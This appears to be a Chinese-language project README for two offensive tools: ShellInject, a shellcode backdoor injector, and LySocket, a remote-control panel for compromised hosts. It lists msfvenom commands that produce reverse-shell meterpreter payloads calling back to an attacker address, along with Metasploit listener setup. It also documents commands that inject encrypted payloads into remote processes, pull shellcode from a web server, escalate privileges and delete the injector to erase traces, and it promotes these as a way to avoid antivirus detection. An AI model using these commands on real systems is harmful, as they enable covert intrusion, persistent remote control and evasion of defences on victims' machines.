# ShellCode 内存后门注入器

<br>

<div align=center>
  
![logo](https://user-images.githubusercontent.com/52789403/185021479-1816c5bc-2ad4-4d54-beca-08ba5e3b3253.png)

<br>

[![Build status](https://cdn.lyshark.com/archive/LyScript/build.svg)](https://github.com/lyshark/PeView) [![Crowdin](https://cdn.lyshark.com/archive/LyScript/email.svg)](mailto:me@lyshark.com)  [![Download x64dbg](https://cdn.lyshark.com/archive/lydebug/download.svg)](https://github.com/lyshark/lydebug/releases) 

</div>

<br>
<b>版本：1.3</b>
<br>
<b>发布日期：2021-07-05 07:25</b>
<br>

ShellInject 是一款通用ShellCode后门注入器，该工具主要用于在后渗透阶段使用，可将后门直接注入到特定进程内存中而不会在磁盘中留下任何痕迹，注入成功后Metasploit即可获取控制权，只要对端不关机则权限会维持，由于内存注入无对应磁盘文件，所以也不会触发杀软报毒。

主要模块与功能:

 - 1.显示可注入进程
 - 2.提升自身权限
 - 3.删除自身痕迹
 - 4.字节数组格式化
 - 5.字节数组格式化
 - 6.文本压缩后异或
 - 7.字符串转为字节数组
 - 8.字节数组加密/解密
 - 9.注入字符串到自身
 - 10.注入字节数组到自身
 - 11.从文本字符串注入
 - 12.注入字符串到远程进程
 - 13.从远程加载字符串并注入
 - 14.从文件读入加密字符串并注入
 - 15.注入加密后的字符串到远程进程

首先需要通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
```
32位载荷生成
[root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c

64位载荷生成
[root@lyshark ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
```
后台侦听器的配置也分为32位与64位，使用时需要与载荷的位数相对应。
```
32位侦听器配置
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 192.168.93.128
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit

64位侦听器配置
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set lhost 192.168.93.128
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit
```

**输出可注入进程:** 列举出目前系统中支持注入的进程，输出参数中最左侧是位数，只可做参考有时不太准确。
```
C:\Users\admin\Desktop> sc32.exe --show

[*] x32 进程PID =>      4        进程名 => System
[*] x32 进程PID =>    124        进程名 => Registry
[*] x32 进程PID =>    468        进程名 => smss.exe
[*] x32 进程PID =>    720        进程名 => csrss.exe
[*] x64 进程PID =>   6888        进程名 => explorer.exe
```

**尝试使用令牌提权:** 该命令可以尝试提升自身权限，不过多半提权会是失败的，但也可以试试。
```C
C:\Users\admin\Desktop> sc32.exe --promote

[+] 获取自身Token
[+] 查询进程特权
[*] 已提升为管理员
```

**清除自身痕迹:** 当我们完成远程注入后，记得将自身在系统中删除，此时的ShellCode直接在目标进程中安家了，不需要注入器了。
```
C:\Users\admin\Desktop> sc32.exe --delself

[*] 自身已清除
```

**将攻击载荷格式化为一行:** 将Metasploit生成的ShellCode载荷保存为文件，然后使用该命令直接将其格式化为一行。

在保存ShellCode的时候，请不要保存头部的定义部分，只保存以下代码即可。
```
C:\Users\admin\Desktop> sc32.exe Format --path d://shellcode.txt

fce88f0000006089e531d2648b52308b520c8b52148b722831ff0fb74a2631c0ac3c601d630000687773325f54684......
```

**将攻击载荷格式化并写出:** 这个格式化函数作用与上方相同，只不过可以直接写出到文件中，在你只有一个cmd权限时，可以使用。
```
C:\Users\admin\Desktop> sc32.exe FormatFile --path d://shellcode.txt --output d://format.txt

[+] 已储存 => d://format.txt
```

**加密/解密攻击载荷:** 如上我们可以将shellcode压缩为一行，然后可以调用xor命令，对这段shellcode进行加密处理。
```
C:\Users\admin\Desktop> sc32.exe Xor --path d://format.txt --passwd lyshark

% &{{%ssssssus{z&vpr'quw{!vqps{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'
```

**压缩载荷并转字节数组:** 将一段已经压缩过的shellcode代码转换为字节数组格式，这个格式可以直接使用。
```
C:\Users\admin\Desktop> sc32.exe Xchg --input d://format.txt --output d://array.txt

[+] 字节已转为双字节
[*] 已写出ShellCode列表 => d://array.txt
```

**异或加密/解密字节数组:** 将字节数组整体加密或解密为字节数组，无需在程序代码中转换，使用更方便。
```
C:\Users\admin\Desktop>sc32.exe XorArray --path d://array.txt --passwd lyshark
```

**将攻击载荷注入自身反弹:** 将一段压缩过的shellcode注入到自身进程并反弹权限。
```
C:\Users\admin\Desktop> sc32.exe InjectSelfShell --shellcode fce88f0000006031d2648b52308b520c***
```

**注入字节数组到自身进程:** 由于字节数组无法直接命令行方式传递，所以只能在文件中获取并压缩解码反弹。
```
C:\Users\admin\Desktop> sc32.exe InjectArrayByte --path d://shellcode.txt
[+] 解码地址: 19db64
```

**从文件中读入并注入:** 从文件中读入一段已经压缩过的shellcode并执行反弹。
```
C:\Users\admin\Desktop> sc32.exe FileInjectShell --path d://format.txt
```

**注入攻击载荷到远程进程:** 该功能主要用于将代码注入到远程进程中，此处参数已经规范化。
```
C:\Users\admin\Desktop> sc32.exe InjectProcShell --pid 17948 --shellcode fce88f0000****
```

**从远程加载载荷并注入:** 从远程Web服务器上获取到需要注入的代码，远程服务器保存一行格式字符串即可。
```
C:\Users\admin\Desktop> sc32.exe InjectWebShell --address 127.0.0.1 --payload shellcode.raw
```

**直接运行加密的攻击载荷:** 加密模块可以直接运行被加密过后的shellcode并反弹，注入时需要传递解码密码。
```
C:\Users\admin\Desktop> sc32.exe EncodeInFile --path d://encode.txt --passwd lyshark
```

**加密注入远程进程反弹:** 直接注入加密后的代码到远程进程中，实现方式如上。
```
C:\Users\admin\Desktop> sc32.exe EncodePidInFile --pid 17480 --path d://encode.txt --passwd lyshark
```

# LySocket 远程注入远控

LySocket 是一款使用纯WindowsAPI实现的命令行版远程控制工具，该工具通过最少的代码实现了套接字的批量管理操作，用户可以指定对特定进程进行远程注入，只要对端客户端能一直运行，则MSF攻击载荷可以很方便的注入并被运行。
```C
[ LySocket ] # help
 _            ____             _        _
| |   _   _  / ___|  ___   ___| | _____| |_
| |  | | | | \___ \ / _ \ / __| |/ / _ \ __|
| |__| |_| |  ___) | (_) | (__|   <  __/ |_
|_____\__, | |____/ \___/ \___|_|\_\___|\__|
      |___/

Usage: LySocket 演示版
Email: me@lyshark.com
Optional:

         --ShowSocket        输出所有上线客户端
         --GetCPU            获取客户端CPU数据
         --GetMemory         获取客户端内存数据
         --GetProcessList    获取客户端正在运行进程列表
         --InjectSelfCode    将ShellCode注入到客户端内
         --InjectRemoteCode  将ShellCode注入到客户端指定进程内
         --CloseServer       正常退出服务端
         --Exit              退出远程客户端
```

命令`ShowSocket`可输出当前有多少肉鸡上线了，用于确定对端IP地址，该套接字列表程序内会自动维护，如果客户端下线则Socket套接字将会被清理。
```C
[ LySocket ] # ShowSocket
--------------------------------------------------------------------
索引             客户端地址              端口            状态
--------------------------------------------------------------------
0                127.0.0.1               1763            Open
1                127.0.0.1               1806            Open
2                127.0.0.1               1807            Open
3                127.0.0.1               1808            Open
--------------------------------------------------------------------
[ LySocket ] #
```
命令`GetCPU,GetMemory`可用于得到对点主机信息，目前只是作为演示案例使用。
```C
[ LySocket ] # GetCPU --address 127.0.0.1
--------------------------------------------------------------------
CPUID: 3219913727
CPU型号: GenuineIntel
idle: 18281250
kernel: 18437500
user: 312500
cpu: 2
--------------------------------------------------------------------

[ LySocket ] # GetMemory --address 127.0.0.1
--------------------------------------------------------------------
内存总量                 内存剩余                内存已使用
--------------------------------------------------------------------
16219 MB                 10953 MB                5266 MB
16219 MB                 10953 MB                5266 MB
16219 MB                 10953 MB                5266 MB
16219 MB                 10953 MB                5266 MB
--------------------------------------------------------------------
```










